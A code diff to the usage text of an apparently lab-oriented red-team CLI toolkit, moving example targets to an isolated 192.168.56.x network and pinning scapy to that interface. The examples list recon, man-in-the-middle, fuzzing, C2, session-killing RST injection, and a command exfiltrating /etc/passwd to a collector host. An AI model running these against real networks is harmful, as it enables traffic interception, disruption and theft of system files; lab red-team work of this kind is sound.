@@ -16,11 +16,11 @@ Commands:
   rst      — RST injection to kill sessions
 
 Examples:
-  sudo python3 redteam_toolkit/cli.py recon  --target 10.0.0.0/24
-  sudo python3 redteam_toolkit/cli.py mitm   --victim 10.0.0.2 --gateway 10.0.0.254
-  sudo python3 redteam_toolkit/cli.py fuzz   --target 10.0.0.2 --port 9000
-  sudo python3 redteam_toolkit/cli.py c2     --target 10.0.0.2
-  sudo python3 redteam_toolkit/cli.py exfil  --file /etc/passwd --collector 10.0.0.1
+  sudo python3 redteam_toolkit/cli.py recon  --target 192.168.56.0/24
+  sudo python3 redteam_toolkit/cli.py mitm   --victim 192.168.56.2 --gateway 192.168.56.254
+  sudo python3 redteam_toolkit/cli.py fuzz   --target 192.168.56.2 --port 9000
+  sudo python3 redteam_toolkit/cli.py c2     --target 192.168.56.2
+  sudo python3 redteam_toolkit/cli.py exfil  --file /etc/passwd --collector 192.168.56.1
 """
 
 import argparse
@@ -32,6 +32,7 @@ sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
 
 from scapy.all import conf
 conf.verb = 0
+conf.iface = conf.route.route("192.168.56.0")[0]  # default to isolated lab NIC (not Vagrant NAT)
 
 BANNER = r"""
   ██████  ██████   ██  ██   ████  ██████ ███  ███
